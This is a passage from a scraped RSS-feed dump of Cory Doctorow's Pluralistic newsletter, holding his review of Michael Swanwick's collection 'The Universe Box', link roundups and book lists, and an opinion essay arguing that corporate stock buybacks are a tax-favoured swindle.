(https://us.macmillan.com/books/9781250865908/picksandshovels).</p>\\n</li>\\n<li>\\n<p>\"The Bezzle\": a sequel to \"Red Team Blues,\" about prison-tech and other grifts, Tor Books (US), Head of Zeus (UK), February 2024 (thebezzle.org).</p>\\n</li>\\n<li>\\n<p>\"The Lost Cause:\" a solarpunk novel of hope in the climate emergency, Tor Books (US), Head of Zeus (UK), November 2023 (http://lost-cause.org).</p>\\n</li>\\n<li>\\n<p>\"The Internet Con\": A nonfiction book about interoperability and Big Tech (Verso) September 2023 (http://seizethemeansofcomputation.org). Signed copies at Book Soup (https://www.booksoup.com/book/9781804291245).</p>\\n</li>\\n<li>\\n<p>\"Red Team Blues\": \"A grabby, compulsive thriller that will leave you knowing more about how the world works than you did before.\" Tor Books http://redteamblues.com.</p>\\n</li>\\n<li>\\n<p>\"Chokepoint Capitalism: How to Beat Big Tech, Tame Big Content, and Get Artists Paid, with Rebecca Giblin\", on how to unrig the markets for creative labor, Beacon Press/Scribe 2022 https://chokepointcapitalism.com</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Unauthorized Bread\": a middle-grades graphic novel adapted from my novella about refugees, toasters and DRM, FirstSecond, 2026\\n</li>\\n<li>\\n<p>\"Enshittification, Why Everything Suddenly Got Worse and What to Do About It\" (the graphic novel), Firstsecond, 2026</p>\\n</li>\\n<li>\\n<p>\"The Memex Method,\" Farrar, Straus, Giroux, 2026</p>\\n</li>\\n<li>\\n<p>\"The Reverse-Centaur\\'s Guide to AI,\" a short book about being a better AI critic, Farrar, Straus and Giroux, June 2026</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>Today\\'s top sources:</p>\\n<p>Currently writing: \"The Post-American Internet,\" a sequel to \"Enshittification,\" about the better world the rest of us get to have now that Trump has torched America (1011 words today, 21655 total)</p>\\n<ul>\\n<li>\"The Reverse Centaur\\'s Guide to AI,\" a short book for Farrar, Straus and Giroux about being an effective AI critic. LEGAL REVIEW AND COPYEDIT COMPLETE.\\n</li>\\n<li>\\n<p>\"The Post-American Internet,\" a short book about internet policy in the age of Trumpism. PLANNING.</p>\\n</li>\\n<li>\\n<p>A Little Brother short story about DIY insulin PLANNING</p>\\n</li>\\n</ul>\\n\\n<p></p>\\n<p>This work \u2013 excluding any serialized fiction \u2013 is licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commercially, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net.</p>\\n<p>https://creativecommons.org/licenses/by/4.0/</p>\\n<p>Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution.</p>\\n\\n\\n<p>Blog (no ads, tracking, or data-collection):</p>\\n<p>Pluralistic.net</p>\\n<p>Newsletter (no ads, tracking, or data-collection):</p>\\n<p>https://pluralistic.net/plura-list</p>\\n<p>Mastodon (no ads, tracking, or data-collection):</p>\\n<p>https://mamot.fr/@pluralistic</p>\\n<p>Medium (no ads, paywalled):</p>\\n<p>https://doctorow.medium.com/</p>\\n<p>Twitter (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://twitter.com/doctorow</p>\\n<p>Tumblr (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</p>\\n<p>\"When life gives you SARS, you make sarsaparilla\" -Joey \"Accordion Guy\" DeVilla</p>\\n<p>READ CAREFULLY: By reading this, you agree, on behalf of your employer, to release me from all obligations and waivers arising from any and all NON-NEGOTIATED agreements, licenses, terms-of-service, shrinkwrap, clickwrap, browsewrap, confidentiality, non-disclosure, non-compete and acceptable use policies (\"BOGUS AGREEMENTS\") that I have entered into with your employer, its partners, licensors, agents and assigns, in perpetuity, without prejudice to my ongoing rights and privileges. You further represent that you have the authority to release me from any BOGUS AGREEMENTS on behalf of your employer.</p>\\n<p>ISSN: 3066-764X</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"pluralistic.net/Pluralistic-%20Michael%20Swanwick%27s%20-The%20Universe%20Box-%20%2803%20Feb%202026%29_20260203/","title":"Pluralistic: Michael Swanwick's \"The Universe Box\" (03 Feb 2026)Today\\'s linksMichael Swanwick\\'s \"The Universe Box\" (permalink)Hey look at this (permalink)Object permanence (permalink)Upcoming appearances (permalink)Recent appearances (permalink)Latest books (permalink)Upcoming books (permalink)Colophon (permalink)How to get Pluralistic:","text":"<p>\u6765\u6e90: pluralistic.net \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 14:16:29 +0000 \u94fe\u63a5: https://pluralistic.net/2026/02/03/the-last-days-of-old-night/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://pluralistic.net/feed/', 'value': '<p>\\n</p>\\n\\n<ul>\\n<li>Michael Swanwick\\'s \"The Universe Box\": Short stories from a science fiction master at the top of his form.\\n</li>\\n<li>Hey look at this: Delights to delectate.\\n</li>\\n<li>Object permanence: DRM lobotomizes \u201chuman memory\u201d; Crayola hex values; Tattoo artists copyright customers\\' bodies.\\n</li>\\n<li>Upcoming appearances: Where to find me.\\n</li>\\n<li>Recent appearances: Where I\\'ve been.\\n</li>\\n<li>Latest books: You keep readin\\' em, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Upcoming books: Like I said, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Colophon: All the rest.\\n</li>\\n</ul>\\n<p></p>\\n\\n<p>\\n</p>\\n\\n<p>No one writes short stories like Michael Swanwick, the five-time Hugo-winning master of science fiction. To prove it, you need only pick up The Universe Box, Swanwick\\'s just-published short story collection, a book representing one of the field\\'s greatest writers at the absolute pinnacle of his game:</p>\\n<p>https://tachyonpublications.com/product/the-universe-box/</p>\\n<p>Science fiction has a long and honorable history with the short story. Sf is  a pulp literature that was born in the pages of magazines specializing in short fiction and serials, and long after other genres had given up the ghost, sf remained steadfastly rooted in short form fiction. There are still, to this day, multiple sf magazines that publish short stories every month, on paper, and pay for it. I started my career as a short story writer, and continue to dabble in the form, but I have mostly moved onto novels.</p>\\n<p>That\\'s a pretty common trajectory in sf, where \u2013 notwithstanding the field\\'s status as a haven for the short story \u2013 the reach (and money) come from novels. But sf has always had a cohort of short fiction writers who are staunchly committed to the form: Harlan Ellison, Martha Soukup, Martha Wells, Ray Bradbury, Ted Chiang, James Tiptree Jr, Theodore Sturgeon, and, of course, Michael Swanwick.</p>\\n<p>It\\'s a little weird, how sf serves as a powerful redoubt for short fiction. After all, sf is a genre in which everything is up for grabs: the reader can\\'t assume anything about the story\\'s setting, its era, the species of its characters. Time can run forwards, backwards, or in a loop. There can be gods and teleporters, faster-than-light drives and superintelligent machines. There can be aliens and space colonies.</p>\\n<p>All of that has to be established in the story. The most straightforward way to do this is, of course, through exposition. There\\'s a commonplace (and wrong) notion that exposition is bad (\"show, don\\'t tell\"). It\\'s fairer to say that exposition is hard \u2013 dramatization is, well, dramatic, which makes it easier to engage the reader\\'s attention. But great exposition is great and sf is a genre that celebrates exposition, done well:</p>\\n<p>https://maryrobinettekowal.com/journal/my-favorite-bit/my-favorite-bit-cory-doctorow-talks-about-the-bezzle/</p>\\n<p>The opposite of exposition is what Jo Walton calls \"incluing,\" \"the process of scattering information seamlessly through the text, as opposed to stopping the story to impart the information\":</p>\\n<p>https://web.archive.org/web/20111119145140/http:/papersky.livejournal.com/324603.html</p>\\n<p>Incluing is a beautiful prose technique, but it makes the reader work. You have to pay close attention to all these subtle clues and build a web of inferences about the kind of world you\\'ve been plunged into. Incluing turns a story into a (wonderful and engaging) puzzle. It makes the aesthetic affect of short sf into something that\\'s not so much a reverie as a high-engagement activity, a mystery whose solution is totally unbounded.</p>\\n<p>This is a terrific experience, but it is also work. Doing that kind of work as part of the process of consuming a 300-page novel is one thing, but trying to get the reader up to speed in a 7,000 word story and still have room left over for the story part is a big lift, and even the best writers end up asking a lot of the reader in their short stories. Sf shorts can be the \"difficult jazz\" of literature, a form and genre that requires \u2013 and rewards \u2013 very active attention.</p>\\n<p>(Incidentally, my favorite incluing example is Mark Twain\\'s classic comedic short, \"The Petrified Man\":)</p>\\n<p>https://americanliterature.com/author/mark-twain/short-story/the-petrified-man/</p>\\n<p>But here\\'s the thing. None of this applies to Swanwick. His stories use a mix of (impeccable) exposition and (subtle) incluing, and yet, there\\'s never a moment in reading a Swanwick story where it feels like work. It\\'s not merely that he\\'s a gorgeous prose-smith whose sentences are each more surpassingly lovely than the last (though he is). Nor does he lack ambition: each of these stories has a more embroidered and outlandish premise than the last.</p>\\n<p>Somehow, though, he just slides these stories into your brain.</p>\\n<p>And what stories they are! They are, by turns, individually and in combination, slapstick, grave, horny, hilarious, surreal, disturbing and heartwarming. They have surprise endings and surprise middles and sometimes surprise beginnings (Swanwick does an opening paragraph like no one else).</p>\\n<p>This is what it means to read a short story collection from an absolute master at the absolute peak of his powers. He can slide you frictionlessly between Icelandic troll tragedies to lethal drone-leopard romantic agonies to battles of the gods and the cigar box that has the universe inside of it. All with the lyricism of Bradbury, the madcap wit of Sturgeon, the unrelenting weirdness of Dick, the heart of Tiptree and the precision of Chiang.</p>\\n<p>This is a book of worlds that each exist for just a handful of pages but occupy more space than those pages could possibly contain. It\\'s a series of cigar boxes, each with the universe inside of it.</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>U.S. Envoys Refused to Report \"Apocalyptic\" Conditions in Gaza. Exclusive Photos Show the Reality They Suppressed https://www.dropsitenews.com/p/northern-gaza-apocalyptic-wasteland-jack-lew-israeli-war-supressed\\n</li>\\n<li>\\n<p>To Avoid a Tax Hike, Billionaires Decide to Take Over California https://prospect.org/2026/02/02/billionaires-california-tax-hike/</p>\\n</li>\\n<li>\\n<p>Mentioned in Hell\u2019s Dispatches https://ftrain.com/mentioned-in-satans-dispatches</p>\\n</li>\\n<li>\\n<p>MAGA\\'s \"People\\'s Capitalism\" https://www.unpopularfront.news/p/magas-peoples-capitalism</p>\\n</li>\\n<li>\\n<p>The Onion\u2019s Exclusive Interview With Pete Hegseth https://theonion.com/the-onions-exclusive-interview-with-pete-hegseth/</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>#20yrsago Sony CD spyware vendor caves to EFF demands https://web.archive.org/web/20060208033113/https://www.eff.org/news/archives/2006_02.php#004378</p>\\n<p>#20yrsago British Library: DRM lobotomizes \u201chuman memory\u201d http://news.bbc.co.uk/2/hi/technology/4675280.stm</p>\\n<p>#15yrsago Hex values for Crayola colors https://en.wikipedia.org/wiki/List_of_Crayola_crayon_colors</p>\\n<p>#15yrsago Michael Lewis explains the Irish econopocalypse https://www.vanityfair.com/news/2011/03/michael-lewis-ireland-201103?currentPage=all</p>\\n<p>#15yrsago Canada\u2019s Internet rescued from weak and pathetic regulator https://web.archive.org/web/20110203054651/http://www.thestar.com/news/canada/article/932571\u2013ottawa-threatens-to-reverse-crtc-decision-on-internet-billing</p>\\n<p>#10yrsago Tattoo artist asserts copyright over customers\u2019 bodies https://www.hollywoodreporter.com/business/business-news/nba-2k-videogame-maker-sued-861131/</p>\\n<p>#10yrsago EU plans to class volunteers who rescue drowning Syrian refugees as \u201ctraffickers\u201d https://www.statewatch.org/news/2016/january/refugee-crisis-council-proposals-on-migrant-smuggling-would-criminalise-humanitarian-assistance-by-civil-society-local-people-and-volunteers-greece-ngos-and-volunteers-have-to-register-with-the-police-and-be-vetted/</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>Salt Lake City: Enshittification at the Utah Museum of Fine Arts (Tanner Humanities Center), Feb 18\\nhttps://tanner.utah.edu/center-events/cory-doctorow/\\n</li>\\n<li>\\n<p>Montreal (remote): Fedimtl, Feb 24\\nhttps://fedimtl.ca/</p>\\n</li>\\n<li>\\n<p>Victoria: 28th Annual Victoria International Privacy &amp; Security Summit, Mar 3-5\\nhttps://www.rebootcommunications.com/event/vipss2026/</p>\\n</li>\\n<li>\\n<p>Berkeley: Bioneers keynote, Mar 27\\nhttps://conference.bioneers.org/</p>\\n</li>\\n<li>\\n<p>Berlin: Re:publica, May 18-20\\nhttps://re-publica.com/de/news/rp26-sprecher-cory-doctorow</p>\\n</li>\\n<li>\\n<p>Berlin: Enshittification at Otherland Books, May 19\\nhttps://www.otherland-berlin.de/de/event-details/cory-doctorow.html</p>\\n</li>\\n<li>\\n<p>Hay-on-Wye: HowTheLightGetsIn, May 22-25\\nhttps://howthelightgetsin.org/festivals/hay/big-ideas-2</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>How the Internet Got Worse (Masters in Business)\\nhttps://www.youtube.com/watch?v=auXlkuVhxMo\\n</li>\\n<li>\\n<p>Enshittification (Jon Favreau/Offline):\\nhttps://crooked.com/podcast/the-enshittification-of-the-internet-with-cory-doctorow/</p>\\n</li>\\n<li>\\n<p>Why Big Tech is a Trap for Independent Creators (Stripper News)\\nhttps://www.youtube.com/watch?v=nmYDyz8AMZ0</p>\\n</li>\\n<li>\\n<p>Enshittification (Creative Nonfiction podcast)\\nhttps://brendanomeara.com/episode-507-enshittification-author-cory-doctorow-believes-in-a-new-good-internet/</p>\\n</li>\\n<li>\\n<p>Enshittification with Plutopia\\nhttps://plutopia.io/cory-doctorow-enshittification/</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Canny Valley\": A limited edition collection of the collages I create for Pluralistic, self-published, September 2025\\n</li>\\n<li>\\n<p>\"Enshittification: Why Everything Suddenly Got Worse and What to Do About It,\" Farrar, Straus, Giroux, October 7 2025\\nhttps://us.macmillan.com/books/9780374619329/enshittification/</p>\\n</li>\\n<li>\\n<p>\"Picks and Shovels\": a sequel to \"Red Team Blues,\" about the heroic era of the PC, Tor Books (US), Head of Zeus (UK), February 2025 (https://us.macmillan.com/books/9781250865908/picksandshovels).</p>\\n</li>\\n<li>\\n<p>\"The Bezzle\": a sequel to \"Red Team Blues,\" about prison-tech and other grifts, Tor Books (US), Head of Zeus (UK), February 2024 (thebezzle.org).</p>\\n</li>\\n<li>\\n<p>\"The Lost Cause:\" a solarpunk novel of hope in the climate emergency, Tor Books (US), Head of Zeus (UK), November 2023 (http://lost-cause.org).</p>\\n</li>\\n<li>\\n<p>\"The Internet Con\": A nonfiction book about interoperability and Big Tech (Verso) September 2023 (http://seizethemeansofcomputation.org). Signed copies at Book Soup (https://www.booksoup.com/book/9781804291245).</p>\\n</li>\\n<li>\\n<p>\"Red Team Blues\": \"A grabby, compulsive thriller that will leave you knowing more about how the world works than you did before.\" Tor Books http://redteamblues.com.</p>\\n</li>\\n<li>\\n<p>\"Chokepoint Capitalism: How to Beat Big Tech, Tame Big Content, and Get Artists Paid, with Rebecca Giblin\", on how to unrig the markets for creative labor, Beacon Press/Scribe 2022 https://chokepointcapitalism.com</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Unauthorized Bread\": a middle-grades graphic novel adapted from my novella about refugees, toasters and DRM, FirstSecond, 2026\\n</li>\\n<li>\\n<p>\"Enshittification, Why Everything Suddenly Got Worse and What to Do About It\" (the graphic novel), Firstsecond, 2026</p>\\n</li>\\n<li>\\n<p>\"The Memex Method,\" Farrar, Straus, Giroux, 2026</p>\\n</li>\\n<li>\\n<p>\"The Reverse-Centaur\\'s Guide to AI,\" a short book about being a better AI critic, Farrar, Straus and Giroux, June 2026</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>Today\\'s top sources:</p>\\n<p>Currently writing: \"The Post-American Internet,\" a sequel to \"Enshittification,\" about the better world the rest of us get to have now that Trump has torched America (1053 words today, 20644 total)</p>\\n<ul>\\n<li>\"The Reverse Centaur\\'s Guide to AI,\" a short book for Farrar, Straus and Giroux about being an effective AI critic. LEGAL REVIEW AND COPYEDIT COMPLETE.\\n</li>\\n<li>\\n<p>\"The Post-American Internet,\" a short book about internet policy in the age of Trumpism. PLANNING.</p>\\n</li>\\n<li>\\n<p>A Little Brother short story about DIY insulin PLANNING</p>\\n</li>\\n</ul>\\n\\n<p></p>\\n<p>This work \u2013 excluding any serialized fiction \u2013 is licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commercially, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net.</p>\\n<p>https://creativecommons.org/licenses/by/4.0/</p>\\n<p>Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution.</p>\\n\\n\\n<p>Blog (no ads, tracking, or data-collection):</p>\\n<p>Pluralistic.net</p>\\n<p>Newsletter (no ads, tracking, or data-collection):</p>\\n<p>https://pluralistic.net/plura-list</p>\\n<p>Mastodon (no ads, tracking, or data-collection):</p>\\n<p>https://mamot.fr/@pluralistic</p>\\n<p>Medium (no ads, paywalled):</p>\\n<p>https://doctorow.medium.com/</p>\\n<p>Twitter (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://twitter.com/doctorow</p>\\n<p>Tumblr (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</p>\\n<p>\"When life gives you SARS, you make sarsaparilla\" -Joey \"Accordion Guy\" DeVilla</p>\\n<p>READ CAREFULLY: By reading this, you agree, on behalf of your employer, to release me from all obligations and waivers arising from any and all NON-NEGOTIATED agreements, licenses, terms-of-service, shrinkwrap, clickwrap, browsewrap, confidentiality, non-disclosure, non-compete and acceptable use policies (\"BOGUS AGREEMENTS\") that I have entered into with your employer, its partners, licensors, agents and assigns, in perpetuity, without prejudice to my ongoing rights and privileges. You further represent that you have the authority to release me from any BOGUS AGREEMENTS on behalf of your employer.</p>\\n<p>ISSN: 3066-764X</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"pluralistic.net/Pluralistic-%20Stock%20swindles%20%2802%20Feb%202026%29_20260202/","title":"Pluralistic: Stock swindles (02 Feb 2026)Today\\'s linksStock swindles (permalink)Hey look at this (permalink)Object permanence (permalink)Upcoming appearances (permalink)Recent appearances (permalink)Latest books (permalink)Upcoming books (permalink)Colophon (permalink)How to get Pluralistic:","text":"<p>\u6765\u6e90: pluralistic.net \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 15:25:37 +0000 \u94fe\u63a5: https://pluralistic.net/2026/02/02/corprophagia/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://pluralistic.net/feed/', 'value': '<p>\\n</p>\\n\\n<ul>\\n<li>Stock swindles: A buyback is not just a dividend by another\\xa0name.\\n</li>\\n<li>Hey look at this: Delights to delectate.\\n</li>\\n<li>Object permanence: Acme License-Plate Maker; IPV4 delenda est; Mandatory gun-ownership; Sukey; Ross and Carrie x LRH; Criti-hype.\\n</li>\\n<li>Upcoming appearances: Where to find me.\\n</li>\\n<li>Recent appearances: Where I\\'ve been.\\n</li>\\n<li>Latest books: You keep readin\\' em, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Upcoming books: Like I said, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Colophon: All the rest.\\n</li>\\n</ul>\\n<p></p>\\n\\n<p>\\n</p>\\n\\n<p>There are plenty of American historical antecedents of Trumpism \u2013 fascist movements like the Jim Crow reign of terror, the McCarthy hearings, the gleeful genocide of indigenous people. But when you\\'re thinking about the rise of Trumpism, never forget that America isn\\'t just a nation of cruel bigots; it\\'s also a nation of rich swindlers.</p>\\n<p>We call Trump a \"reality TV star\" and it\\'s true, as far as it goes. Trump did play a billionaire on TV long before he grifted actual billions, using his status as the poor man\\'s idea of a rich man to secure liar loans and rip off creditors, contractors, business partners, workers, and governments \u2013 local, state and federal.</p>\\n<p>He rose to power on this, boasting on stage that cheating \"makes me smart\":</p>\\n<p>https://pluralistic.net/2024/12/04/its-not-a-lie/#its-a-premature-truth</p>\\n<p>Like so many crooked officials, Trump\\'s brand is \"He steals, but he works\" (except of course that he doesn\\'t \u2013 at any given moment, odds are that he\\'s either taking a nap, watching Fox News, or playing golf):</p>\\n<p>https://www.reddit.com/r/AskBalkans/comments/utui8s/in_romania_we_have_a_saying_about_corrupt/</p>\\n<p>Remember: the right is the movement that says that governments are inefficient and corrupt, so right wing elected leaders make their own case by being incompetent and corrupt. Someone like Trump has to convince people that they can\\'t rely on institutions or their neighbors. His path to power lies through convincing people that the system is rigged and that he \u2013 as a man who is an expert at cheating \u2013 knows how to rig it in your favor:</p>\\n<p>https://www.factcheck.org/2016/07/trumps-rigged-claim/</p>\\n<p>But merely claiming \"the system is rigged\" doesn\\'t actually win the day. If you want to convince people that the system is rigged, it really helps if the system is actually rigged. Want to convince people that elections are corrupt? Legalize unlimited dark money spending and fill our polling places with defective, unauditable voting machines made by Beltway Bandits selling into no-bid contracts:</p>\\n<p>https://web.archive.org/web/20210203113531/https://www.washingtonpost.com/outlook/2021/02/03/voting-machines-election-steal-conspiracy-flaws/</p>\\n<p>Want to convince people that there\\'s a shadowy cabal of rich pedophiles hiding children in a pizza parlor basement? It helps if there\\'s an actual cabal of rich pedophiles hanging out on a private island, abusing more than a thousand children (and counting). Want to convince people that the financial system is a rigged casino so you might as well just gamble on cryptocurrency and betting markets? It helps if the actual financial system is run by banks who receive billions in public money and then steal millions of Americans\\' homes after Obama takes Treasury Secretary Tim Geithner\\'s advice to \"foam the runways\" for the banks using Americans\\' houses:</p>\\n<p>https://keystoneky.com/article/all-we-can-do-is-put-foam-on-the-runway-tim-geithner-speaking-before-the-collapse-of-lehman/</p>\\n<p>Which is all to say, if you want to understand the origins of the surge of suckers for fascists who are desperate for a strong man to cheat on their behalf in a rigged system, it helps to look beyond racism and xenophobia, to the ways in which the system is, indeed, rigged. Racism and misogyny alone aren\\'t enough to bring about fascism. To groom a nation of fascist patsies, you first need a crooked system:</p>\\n<p>https://pluralistic.net/2025/07/22/all-day-suckers/#i-love-the-poorly-educated</p>\\n<p>This is why it\\'s worth understanding finance. The finance sector hides its sins behind the Shield of Boringness (h/t Claire Evans). The layers of overlapping jargon and performative complexity make it hard for everyday people to criticize the finance sector. Finance ghouls exploit this, leveraging confusing ambiguities in the system to insist that their critics don\\'t know what they\\'re talking about and that everything is fine, actually. This is an incredibly destabilizing dynamic. Living in a system where you\\'re being fleeced every day but where people who seem smarter than you have reasonable-seeming explanations about why it\\'s all legit and above-board is a recipe for abandoning all faith in the system, in experts, and in lawful processes, and throw your lot in with a strongman who promises to cheat on your behalf.</p>\\n<p>Take stock buybacks, a form of stock swindle that was illegal until 1982. In a stock buyback, a company buys its own shares on the open market. When the number of shares goes down, the price per share goes up. This is just a form of \"wash-trading,\" like when NFT and shitcoin scammers buy their own products in order to make it look like they\\'re valuable and desirable:</p>\\n<p>https://pluralistic.net/2025/09/06/computer-says-huh/#invisible-handcuffs</p>\\n<p>Advocates for markets as a system of allocation (as opposed to allocating via a democratically accountable state, say) insist that markets are efficient because prices \"encode information\" about the desirability, viability, and other qualities of goods and services. This is the whole argument for the new crop of rigged casinos we call \"prediction markets\" that are grooming the next generation of fascist footsoldiers by robbing them blind and then insisting that the whole process was not only legitimate, but scientific, a way to retrieve the \"encoded information\" about the world around us.</p>\\n<p>In a market system, stock prices are supposed to reflect the aggregated information about the health and prospects of a company. When a company buys its own stock back, though, its price goes up while its value goes down.</p>\\n<p>I mean that literally: say a company that\\'s sitting on a billion dollars cash is valued at $10 billion. From this, we can infer that the company\\'s capital stock (factories, inventory, etc), IP (patents, processes, copyrights, etc) and human capital (payrolled employees, contractors) are worth $9 billion. That\\'s a reliable estimate, because we know exactly how much one billion dollars cash is worth: it\\'s worth one billion dollars.</p>\\n<p>Now, let that company piss that billion dollars up the wall with a stock buyback. The company is relieved of its billion dollars cash on hand, leaving it with no cash, only its physical capital, IP and human capital, which are worth $9b. The company is now worth less than it was before the stock buyback.</p>\\n<p>What\\'s more, the drop in corporate valuation is more than the billion the company just blew on its buyback. A company with no cash reserves is brittle and prone to failures. Without a cash cushion, any rent shock, change in market conditions, or other adverse incident will leave the company scrambling to borrow money (at punitive rates, thanks to its desperation) to weather the storm. If share prices are actually \"encoding information\" about a company\\'s worth, a billion dollar buyback should lop more than a billion dollars off the company\\'s share price. Instead, it sends the share price up.</p>\\n<p>This is just stock manipulation, which is why it was illegal until 1982. But apologists for this system will tell you that a stock buyback is just a dividend by another name \u2013 just another way for a company to return value to its shareholders, who, after all, are the owners of the company and entitled to extract those profits.</p>\\n<p>This is categorically untrue. Dividends do take money out of the company\\'s coffers and distribute them to its shareholders, sure \u2013 but a dividend is a bet on the company\\'s future success, which is why a company\\'s share prices rise after a dividend is declared. Investors observe a company that is so well-run that it can afford to drain some of its cash reserves in favor of its shareholders, so they buy the company\\'s stock in anticipation of more dividends derived from more skilled operations.</p>\\n<p>But imagine if a company parted with a dividend so large that it meant that the firm would struggle to keep its doors open in the coming year. Imagine a publisher, say, whose dividend was so large that it couldn\\'t afford to pay advances for any more books in the next season, meaning it could only make money from the backlist titles it already had in the warehouse, but was entirely out of the running when it came to publishing next year\\'s blockbuster book.</p>\\n<p>That dividend would not send investors chasing the company\\'s stock. Why would you bet on a stock whose management had just doomed the company to a bad season, and maybe an unrecoverable death-spiral? Without new books to sell, the company won\\'t have any cash to pay dividends, and when it stops paying dividends, its stock price will fall, leaving shareholders with a hole in their own balance-sheets.</p>\\n<p>Contrast that with buybacks: to do a buyback, the company need merely spend its free cash flow, or money it borrows, or money derived from the sale of key capital, or money saved through mass layoffs, to buy its own stock. Then the share price goes up.</p>\\n<p>In other words: when a company\\'s stock price rises on news of a dividend, that\\'s \"encoding information\" about the market\\'s confidence in the company\\'s management and its future growth. When a company\\'s stock price rises on news of a buyback, that\\'s \"encoding information\" about the market\\'s confidence in the company\\'s future looting to the point of collapse.</p>\\n<p>I used to think that this was the whole stock buyback story, but as is ever the case with finance, buybacks are fractally corrupt. This week, I\\'ve been reading Boston College law prof Ray D Madoff\\'s book The Second Estate: How the Tax Code Made an American Aristocracy, and I\\'ve learned even more scummy truths about buybacks:</p>\\n<p>https://press.uchicago.edu/ucp/books/book/chicago/S/bo256019296.html</p>\\n<p>For tax purposes, dividends are \"ordinary income,\" meaning that they are taxed at up to 37%. Meanwhile, if you sell your shares after a stock buyback juices the price, the profits are treated as \"capital gains,\" whose tax rate caps out at about half that (20%). This means that shareholders pay half the tax on money that comes from strip-mining a company than they would get from money derived from managing a company for sustainable growth.</p>\\n<p>It\\'s worse than that, though, because capital gains can be offset by capital losses. If you invested in a stock that tanked, you can hold that stock in your portfolio until you are ready to sell a profitable stock, and deduct your losses from the gains you\\'ve made.</p>\\n<p>But you don\\'t even have to sell the stock to realize tax-free income from it: the ultra-rich live according to a financial arrangement called \"buy, borrow, die\" that lets them avoid all taxes.</p>\\n<p>Here\\'s how that works: if you\\'re sitting on a bunch of stock, you can stake it as collateral for a loan that is tax-free. Better than that, if you\\'re smart, some or all of the interest on that loan is tax-deductible. If you\\'re rich enough, you don\\'t have to make regular payments on the loan, either \u2013 you just wait as the stock continues to grow while your loan is maturing, and when it\\'s due, you borrow even more money against the new valuation and pay off the old loan.</p>\\n<p>That\\'s \"buy\" and \"borrow.\" Here\\'s \"die.\" When you die, you transfer your assets to your kids, who benefit from something called the \"step-up in basis,\" which lets them avoid all capital gains on the appreciated value of your assets.</p>\\n<p>Now, maybe you\\'re thinking that you can benefit from this arrangement. I\\'ve got bad news for you: you won\\'t qualify for one of those cool loans that you don\\'t need to pay regularly! What\\'s more, if you own any stock you almost certainly own it through a retirement plan like a 401(k), and when you cash out that 401(k), that is treated as \"ordinary income\" at nearly twice the rate that our plutocrat overlords pay.</p>\\n<p>Buybacks, then, are part of a system whereby rich people get much richer every time a company that makes something good and employs ordinary people guts itself and sets itself on the path to bankruptcy. Meanwhile, working people don\\'t benefit from this system, even if they own stock. They just get to live in a world where businesses are looted and shuttered and public services are slashed thanks to balanced budget rules that mean that governments can\\'t spend when rich people don\\'t pay taxes.</p>\\n<p>This is why buybacks have apologists. Buybacks \u2013 a stock swindle that was illegal in living memory \u2013 make rich people richer, and they spend some of that loot to fund an army of reply-ghouls who push the message that buybacks are dividends by another name.</p>\\n<p>It\\'s part of the ripoff economy that has seen crypto-billionaires lobby, bribe and terrorize lawmakers into merging their speculative assets with the real economy, endangering the economic well-being of everyday people:</p>\\n<p>https://www.levernews.com/what-tech-wants-crypto-reign-of-terror/</p>\\n<p>It\\'s part of the ripoff economy that has seen AI bros put the global market in peril with crooked accounting and empty promises:</p>\\n<p>https://www.wheresyoured.at/the-enshittifinancial-crisis/</p>\\n<p>The ripoff economy is baked into the American experience. It is the foundation of Trumpism. It is the financial basis for things like \"Project 2025\" \u2013 literally! The Heritage Foundation (who created Project 2025) was founded and funded by the founders of Amway, a destructive Ponzi scheme that was rescued from criminal prosecution when Gerald Ford (Congressman to Amway\\'s founders) became president and ordered the FTC to let them off the hook:</p>\\n<p>https://pluralistic.net/2025/05/05/free-enterprise-system/#amway-or-the-highway</p>\\n<p>Trump\\'s right: the system is rigged. If you\\'re going to pull the people you love back from the nihilistic descent into fascism, you have to be able to understand and explain how the rigging works. We can\\'t insist \u2013 as Hillary Clinton did \u2013 that \"America is already great\":</p>\\n<p>https://www.politico.com/blogs/2016-dem-primary-live-updates-and-results/2016/03/clinton-america-is-already-great-220078</p>\\n<p>America is not great. It has been gutted by the Epstein class, who robbed us blind, raped our kids, and are now selling us shitcoins and chatbots and the spectacle of protesters being shot in the streets. But it\\'s not enough to know that the system is rigged. Everybody knows the system is rigged. To build a movement and save our future, we have to know how it is rigged and who rigged it.</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>Wherein I have some thoughts on food delivery apps 